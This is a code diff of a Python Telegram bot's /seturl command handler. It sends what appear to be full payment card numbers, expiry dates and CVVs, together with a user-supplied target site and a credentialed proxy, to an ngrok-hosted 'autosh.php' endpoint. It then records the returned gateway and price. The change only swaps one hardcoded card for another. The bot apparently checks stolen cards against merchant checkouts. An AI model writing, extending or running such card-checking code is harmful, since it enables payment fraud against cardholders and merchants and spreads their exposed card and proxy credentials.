@@ -2604,8 +2604,6 @@ import aiohttp
 from db import get_user, update_user
 from html import escape
 
-API_CHECK_TEMPLATE = "https://7feeef80303d.ngrok-free.app/autosh.php?cc=5444228607773355|04|28|974&site={site}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-
 async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handler for /seturl command"""
     user_id = update.effective_user.id
@@ -2636,8 +2634,14 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode=ParseMode.HTML
     )
 
-    # Call API
-    api_url = API_CHECK_TEMPLATE.format(site=site_input)
+    # Build API URL directly for site check (fixed logic)
+    api_url = (
+        "https://7feeef80303d.ngrok-free.app/autosh.php"
+        "?cc=4546788796826918|09|2030|781"
+        f"&site={site_input}"
+        "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+    )
+
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=30) as resp:
@@ -2648,7 +2652,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Extract info from API response
     response_text = data.get("Response", "Unknown")
-    price = data.get("Price", "1.0")  # default 1.0 if not present
+    price = data.get("Price", "1.0")  # default 1.0 if missing
     gateway = data.get("Gateway", "Unknown")
 
     # Update DB
@@ -2670,6 +2674,7 @@ async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """
 
     await msg.edit_text(final_message, parse_mode=ParseMode.HTML)
+
 
 
 async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
